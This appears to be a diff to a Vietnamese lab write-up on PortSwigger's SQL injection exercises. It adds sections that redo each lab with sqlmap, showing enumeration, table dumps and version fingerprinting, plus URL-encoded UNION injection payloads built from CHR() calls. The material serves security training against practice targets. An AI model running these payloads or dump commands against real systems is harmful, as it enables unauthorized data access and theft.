@@ -239,6 +239,61 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/HyCDHEs5p.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này và dùng sqlmap với payload
+
+```!
+sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/SJUfCb73T.png)
+
+![ảnh](https://hackmd.io/_uploads/H19XCWX3p.png)
+
+mình biết được database ở đây dùng là PostgreSQL
+
+mình sẽ tìm database được dùng trong web này
+
+![ảnh](https://hackmd.io/_uploads/HJ3PkMXnT.png)
+
+và mình tìm được database là **public**
+
+![ảnh](https://hackmd.io/_uploads/Bk6TkfQ36.png)
+
+tìm trong database public mình được table products với
+
+```sql!
+ sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public --tables
+        ___
+```
+
+tiếp tục tìm thông tin về tên các cột với lệnh
+
+```!
+sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public -T  products --columns
+```
+
+mình được
+
+![ảnh](https://hackmd.io/_uploads/ryt7Zzm26.png)
+
+và mình tìm được 8 cột trong đó có cột released
+
+mình lấy thông tin sản phẩm của bảng products này ra với lệnh
+
+```!
+sqlmap -u https://0a0600e904b01dae81da442400a500d4.web-security-academy.net/filter?category=Accessories --batch -D public -T  products --dump
+```
+
+và được
+
+![ảnh](https://hackmd.io/_uploads/r1dkmz7n6.png)
+
+và xem được 17 sản phẩm trong table trong khi trang web chỉ hiển thị ra giao diện web 12 sản phẩm
+
+![ảnh](https://hackmd.io/_uploads/SJ3rQMXhp.png)
+
 ## 2. Lab: SQL injection vulnerability allowing login bypass
 
 link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
@@ -317,6 +372,20 @@ mục đích của chúng ta đã hoàn thành và mình cũng đã giải quy�
 
 ![image](https://hackmd.io/_uploads/H1jEnEjqp.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này theo sqlmap
+
+mình vào burp suite và chuột phải nhấn copy to file và dùng sqlmap để quét file này
+
+![ảnh](https://hackmd.io/_uploads/BJfFLfX26.png)
+
+mình quét file này với lệnh
+
+```sql!
+sqlmap -r sqlmap.txt --batch --threads=5 --level=5 --risk=3
+```
+
 ## 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
 link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -379,9 +448,43 @@ soup = BeautifulSoup(response.text,'html.parser')
 print(soup)
 ```
 
-mục đích của chúng ta đã hoàng thành và mình cũng đã giait được bài lab này
+mục đích của chúng ta đã hoàng thành và mình cũng đã giải được bài lab này
 
 ![image](https://hackmd.io/_uploads/S1Dv9ci9T.png)
+
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+
+đầu liên mình dùng lệnh sau để quét
+
+```sql!
+sqlmap -u https://0a1000b60490bae5807117cd00b700f6.web-security-academy.net/filter?category=Lifestyle  --batch
+```
+
+và mình được
+
+![ảnh](https://hackmd.io/_uploads/rydBtGm26.png)
+
+và được database dùng PostgreSQL và có thể khai thác với kiểu tấn công UNION với 3 cột
+
+dùng payload mà sql cho mình in được dòng chữ **qkqpqsJoqpnIRhMdUOashnnrPzQcseUKTwYmOlUHQLRvMqxqvq** ra màn mình
+
+```sql!
+https://0a1000b60490bae5807117cd00b700f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20ALL%20SELECT%20NULL,(CHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113))%7C%7C(CHR(115)%7C%7CCHR(74)%7C%7CCHR(111)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(110)%7C%7CCHR(73)%7C%7CCHR(82)%7C%7CCHR(104)%7C%7CCHR(77)%7C%7CCHR(100)%7C%7CCHR(85)%7C%7CCHR(79)%7C%7CCHR(97)%7C%7CCHR(115)%7C%7CCHR(104)%7C%7CCHR(110)%7C%7CCHR(110)%7C%7CCHR(114)%7C%7CCHR(80)%7C%7CCHR(122)%7C%7CCHR(81)%7C%7CCHR(99)%7C%7CCHR(115)%7C%7CCHR(101)%7C%7CCHR(85)%7C%7CCHR(75)%7C%7CCHR(84)%7C%7CCHR(119)%7C%7CCHR(89)%7C%7CCHR(109)%7C%7CCHR(79)%7C%7CCHR(108)%7C%7CCHR(85)%7C%7CCHR(72)%7C%7CCHR(81)%7C%7CCHR(76)%7C%7CCHR(82)%7C%7CCHR(118)%7C%7CCHR(77))%7C%7C(CHR(113)%7C%7CCHR(120)%7C%7CCHR(113)%7C%7CCHR(118)%7C%7CCHR(113)),NULL--
+```
+
+![ảnh](https://hackmd.io/_uploads/SJK6iGm2a.png)
+
+![ảnh](https://hackmd.io/_uploads/B1DwszmnT.png)
+
+nhưng lab để solve lab cần dùng lệnh UNION sau
+
+```sql!
+' UNION SELECT NULL, NULL, NULL -- -
+```
+
+![ảnh](https://hackmd.io/_uploads/HJpmTzX2p.png)
 
 ## 4. Lab: SQL injection UNION attack, finding a column containing text
 
@@ -477,6 +580,33 @@ print(soup)
 mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/HykgNOhcp.png)
+
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình dùng lệnh sau để quét
+
+```sql!
+sqlmap -u https://0afb0092044d2e6780392b68009700af.web-security-academy.net/filter?category=Gifts  --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/SyNXAfmh6.png)
+
+và được database dùng PostgreSQL và có thể khai thác với kiểu tấn công UNION với 3 cột và sqlmap tìm được cột thứ 2 có kiểu string
+
+![ảnh](https://hackmd.io/_uploads/ry_sRMQhT.png)
+
+dùng payload mà sql cho mình in được dòng chữ **qqbjqgubDxLTuBPARNqUilGmsRvZIHalWZdTDcNlNmUUXqzzzq** ra màn mình
+
+```sql!
+https://0afb0092044d2e6780392b68009700af.web-security-academy.net/filter?category=Gifts%27%20UNION%20ALL%20SELECT%20NULL,(CHR(113)||CHR(113)||CHR(98)||CHR(106)||CHR(113))||(CHR(103)||CHR(117)||CHR(98)||CHR(68)||CHR(120)||CHR(76)||CHR(84)||CHR(117)||CHR(66)||CHR(80)||CHR(65)||CHR(82)||CHR(78)||CHR(113)||CHR(85)||CHR(105)||CHR(108)||CHR(71)||CHR(109)||CHR(115)||CHR(82)||CHR(118)||CHR(90)||CHR(73)||CHR(72)||CHR(97)||CHR(108)||CHR(87)||CHR(90)||CHR(100)||CHR(84)||CHR(68)||CHR(99)||CHR(78)||CHR(108)||CHR(78)||CHR(109)||CHR(85)||CHR(85)||CHR(88))||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)),NULL--
+```
+
+![ảnh](https://hackmd.io/_uploads/SJ6l1X73a.png)
+
+![ảnh](https://hackmd.io/_uploads/S15WkQmh6.png)
+
+và mình chèn chuỗi đề bài cho vào cột thứ 2 và solve được lab
 
 ## 5. Lab: SQL injection attack, querying the database type and version on Oracle
 
@@ -588,6 +718,31 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/S10hrrsqa.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình dùng lệnh sau để quét
+
+```sql!
+sqlmap -u https://0ad9004c04ceb2d683ea28c100320045.web-security-academy.net/filter?category=Lifestyle --batch
+```
+
+và mình được
+
+![ảnh](https://hackmd.io/_uploads/SkEvf7Qha.png)
+
+vậy ở đây lab dùng hệ quản trị CSDL Oracle và chúng ta có thể tấn công UNION với 2 cột
+
+tiếp tục dùng lệnh sau để xem thông tin phiên bản của CSDL này
+
+```sql!
+sqlmap -u https://0ad9004c04ceb2d683ea28c100320045.web-security-academy.net/filter?category=Lifestyle --batch --fingerprint -banner
+```
+
+![ảnh](https://hackmd.io/_uploads/ryfRmQm3p.png)
+
+vậy mình được version CSDL được lab này dùng là **11.2.0.2.0**
+
 ## 6. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
@@ -666,6 +821,23 @@ print(soup)
 mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/HyGHt_n9a.png)
+
+### SQL
+
+- mình đã làm lại bài này với sqlmap
+- tương tự bài trên mình dùng lệnh sau để xem version của database
+
+```sql!
+ sqlmap -u https://0a9100d80392921f84f9077c007f003f.web-security-academy.net/filter?category=Lifestyle  --batch --fingerprint -banner
+```
+
+và được
+
+![ảnh](https://hackmd.io/_uploads/rkHQ87XnT.png)
+
+vậy có được version **8.0.36-0ubuntu0.20.04.1**
+
+![ảnh](https://hackmd.io/_uploads/rJ6VLm7ha.png)
 
 ## 7. Lab: SQL injection UNION attack, retrieving data from other tables
 
@@ -1577,6 +1749,8 @@ sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --dump
   - select database() trả về tên của cơ sở dữ liệu hiện tại.
   - substring(string, start, length) là một hàm trong SQL dùng để trích xuất một phần của chuỗi string bắt đầu từ vị trí start với chiều dài length.
   - Trong trường hợp này, substring((select database()),1,1) có nghĩa là trích xuất một ký tự từ chuỗi kết quả của select database(). Cụ thể, với start là 1 và length là 1, nó sẽ trả về ký tự đầu tiên của tên cơ sở dữ liệu hiện tại.
+
+<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
 
 ## Tài liệu tham khảo
 
